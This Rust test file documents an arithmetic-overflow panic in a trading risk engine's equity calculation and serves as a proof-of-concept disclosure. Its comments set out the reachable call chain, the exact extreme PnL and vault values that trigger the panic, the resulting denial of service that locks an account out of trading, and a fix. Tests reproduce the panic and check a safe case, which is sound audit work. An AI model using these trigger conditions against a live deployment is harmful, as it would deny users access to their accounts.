//! Bug #3 — `account_equity_trade_open_raw` panics on `mul_div_floor_u128`
//! overflow at engine `src/percolator.rs` line 3915.
//!
//! # Concrete state transition
//!
//! Engine line 3914-3915 in `account_equity_trade_open_raw`:
//! ```ignore
//! let g_num = core::cmp::min(residual, pnl_pos_tot_trade_open);
//! mul_div_floor_u128(pos_pnl_trade_open, g_num, pnl_pos_tot_trade_open)
//! ```
//!
//! `mul_div_floor_u128` (wide_math.rs line 1600) panics on
//! `pos_pnl_trade_open.checked_mul(g_num)` overflow:
//! ```ignore
//! let p = a.checked_mul(b).expect("mul_div_floor_u128: a*b overflow");
//! ```
//!
//! # Reachability — public-API call chain (VERIFIED)
//!
//! 1. `TradeNoCpi` BPF instruction (wrapper)
//! 2. → `execute_trade_with_matcher` (wrapper)
//! 3. → `execute_trade_not_atomic` (engine, line 5237)
//! 4. → `enforce_one_side_margin` (engine, line 5660)
//! 5. → `is_above_initial_margin_trade_open` (defined at engine line 3944, called from `enforce_one_side_margin` at engine line 5715)
//! 6. → `account_equity_trade_open_raw` (defined at engine line 3865) — PANIC site at line 3915
//!
//! This native PoC exercises step 6 directly with adversarial-but-engine-valid
//! state. A LiteSVM PoC can wrap this through the BPF entrypoint chain.
//!
//! # Witness state
//!
//! - `account.pnl ≈ 2^106` (close to MAX_ACCOUNT_POSITIVE_PNL = 1e32 ≈ 2^106.3)
//! - `engine.pnl_pos_tot = account.pnl` (single positive-PnL account)
//! - `engine.vault ≈ 2^53` (near MAX_VAULT_TVL = 1e16 ≈ 2^53.2)
//! - `engine.c_tot = 0`, `engine.insurance_fund.balance = 0`
//!   (so `residual = vault`)
//! - `candidate_trade_pnl = 0` (so `pos_pnl_trade_open = pos_pnl`)
//!
//! Computation:
//! - `pnl_pos_tot_trade_open = pnl_pos_tot - pos_pnl + pos_pnl_trade_open = pos_pnl`
//! - `g_num = min(residual, pnl_pos_tot_trade_open) = min(2^53, 2^106) = 2^53`
//! - `mul_div_floor_u128(2^106, 2^53, 2^106) → 2^106 × 2^53 = 2^159 > u128::MAX = 2^128`
//! - `checked_mul` returns `None` → `expect("a*b overflow")` PANIC
//!
//! # Impact tier
//!
//! Same as Bug #2: availability / DoS. Solana tx-level rollback prevents
//! persistent state corruption, but every subsequent trade-margin check on
//! the affected account re-triggers the panic. The account is bricked from
//! the trade lane until pos_pnl drops below the overflow threshold.
//!
//! # Suggested fix
//!
//! Same as Bug #2: replace `mul_div_floor_u128` with `wide_mul_div_floor_u128`
//! (already in codebase, U256 intermediate). Quotient is bounded by
//! `pos_pnl_trade_open` so output fits in u128.

#![cfg(feature = "test")]

use percolator::*;

fn extreme_pnl_params() -> RiskParams {
    RiskParams {
        maintenance_margin_bps: 500,
        initial_margin_bps: 1000,
        trading_fee_bps: 10,
        max_accounts: 64,
        liquidation_fee_bps: 100,
        liquidation_fee_cap: i128::U128::new(1_000_000),
        min_liquidation_abs: i128::U128::new(0),
        min_nonzero_mm_req: 10,
        min_nonzero_im_req: 11,
        h_min: 1,
        h_max: 100,
        resolve_price_deviation_bps: 1000,
        max_accrual_dt_slots: 100,
        max_abs_funding_e9_per_slot: 10_000,
        min_funding_lifetime_slots: 10_000_000,
        max_active_positions_per_side: MAX_ACCOUNTS as u64,
        max_price_move_bps_per_slot: 3,
    }
}

fn add_user_test(engine: &mut RiskEngine, _fee_payment: u128) -> Result<u16> {
    let idx = engine.free_head;
    if idx == u16::MAX || (idx as usize) >= MAX_ACCOUNTS {
        return Err(RiskError::Overflow);
    }
    engine.deposit_not_atomic(idx, 1, 100)?;
    Ok(idx)
}

#[test]
#[should_panic(expected = "a*b overflow")]
fn v11_l1_trade_open_raw_native_mul_panic() {
    let mut engine = RiskEngine::new(extreme_pnl_params());
    let idx = add_user_test(&mut engine, 0).unwrap() as usize;

    // Plant pos_pnl ≈ 2^106 (just under MAX_ACCOUNT_POSITIVE_PNL = 1e32 ≈ 2^106.3).
    // Single account holds the entire pnl_pos_tot pool.
    let huge_pnl: i128 = 1i128 << 106;
    let huge_u: u128 = huge_pnl as u128;

    engine.accounts[idx].pnl = huge_pnl;
    engine.pnl_pos_tot = huge_u;
    engine.accounts[idx].reserved_pnl = 0; // not in scheduled bucket; full positive PnL is "live"

    // Plant vault ≈ 2^53 (just under MAX_VAULT_TVL = 1e16 ≈ 2^53.2). c_tot
    // holds only the deposit, insurance balance is zero. residual = vault.
    engine.vault = i128::U128::new(1u128 << 53);

    // Now call account_equity_trade_open_raw with candidate_trade_pnl=0.
    //   pnl_pos_tot_trade_open = pnl_pos_tot - pos_pnl + pos_pnl = pos_pnl = 2^106
    //   senior_sum            = c_tot + insurance = small (just deposit)
    //   residual              = vault - senior_sum ≈ 2^53
    //   g_num                 = min(residual, pnl_pos_tot_trade_open) = 2^53
    //   product               = pos_pnl_trade_open × g_num = 2^106 × 2^53 = 2^159
    //                                                        > u128::MAX = 2^128 → PANIC
    let acct = engine.accounts[idx];
    let _ = engine.account_equity_trade_open_raw(&acct, idx, 0);
}

/// Sanity: with pos_pnl small enough that 2^pos_pnl × 2^vault < 2^128,
/// the helper returns Ok. Confirms the panic above is config-driven, not
/// spec-driven.
#[test]
fn v11_l1_trade_open_raw_safe_with_small_pnl() {
    let mut engine = RiskEngine::new(extreme_pnl_params());
    let idx = add_user_test(&mut engine, 0).unwrap() as usize;

    // Small pos_pnl (2^60). Product 2^60 × 2^53 = 2^113 ≪ 2^128. SAFE.
    let small_pnl: i128 = 1i128 << 60;
    let small_u: u128 = small_pnl as u128;

    engine.accounts[idx].pnl = small_pnl;
    engine.pnl_pos_tot = small_u;
    engine.accounts[idx].reserved_pnl = 0;

    engine.vault = i128::U128::new(1u128 << 53);

    let acct = engine.accounts[idx];
    let eq = engine.account_equity_trade_open_raw(&acct, idx, 0);
    // Equity should be a finite i128 (not the corrupt-marker i128::MIN+1).
    assert_ne!(eq, i128::MIN + 1, "should not corrupt-marker on safe pnl");
}
